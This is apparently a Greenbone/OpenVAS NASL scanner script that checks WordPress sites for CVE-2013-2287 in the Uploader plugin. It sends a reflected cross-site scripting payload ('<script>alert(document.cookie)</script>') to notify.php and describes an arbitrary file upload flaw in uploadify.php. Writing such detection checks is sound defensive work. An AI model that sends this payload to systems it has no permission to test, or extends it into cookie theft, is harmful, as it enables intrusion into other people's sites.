CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804540" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_cve_id( "CVE-2013-2287" );
	script_bugtraq_id( 58285 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2014-04-14 18:31:45 +0530 (Mon, 14 Apr 2014)" );
	script_name( "WordPress Uploader Plugin Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with WordPress Uploader plugin and is prone to
multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not." );
	script_tag( name: "insight", value: "Flaws are due to:

  - Input passed via the 'blog' GET parameter to notify.php is not properly
  sanitised before being returned to the user.

  - The uploadify.php script allows the upload of files with arbitrary
  extensions to a folder inside the webroot." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site and
compromise a vulnerable system." );
	script_tag( name: "affected", value: "WordPress Uploader Plugin 1.0.4, Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52465" );
	script_xref( name: "URL", value: "https://www.dognaedis.com/vulns/DGS-SEC-16.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/uploader/views/notify.php?notify=" + "unnotif&blog=<script>alert(document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: "NaN file uploaded" )){
	security_message( http_port );
	exit( 0 );
}

